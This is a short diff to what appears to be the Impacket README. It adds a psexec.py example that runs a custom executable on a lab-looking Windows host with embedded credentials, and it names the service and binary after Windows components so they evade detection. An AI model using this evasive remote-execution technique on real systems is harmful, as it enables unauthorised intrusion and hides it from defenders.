@@ -18,6 +18,10 @@ python3 -m venv venv
 pip install -r requirements.txt
 python3 setup.py install
 ```
+psexec.py can be used like this to make it more evasive
+```
+python3 psexec.py north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 -file ../psexec-mod/NjWQJYhRSvc.exe -service-name "PrintWorkflow_7c3bc" -remote-binary-name "WMSysPr9.exe" -debug
+```
 
 Impacket is a collection of Python classes for working with network
 protocols. Impacket is focused on providing low-level
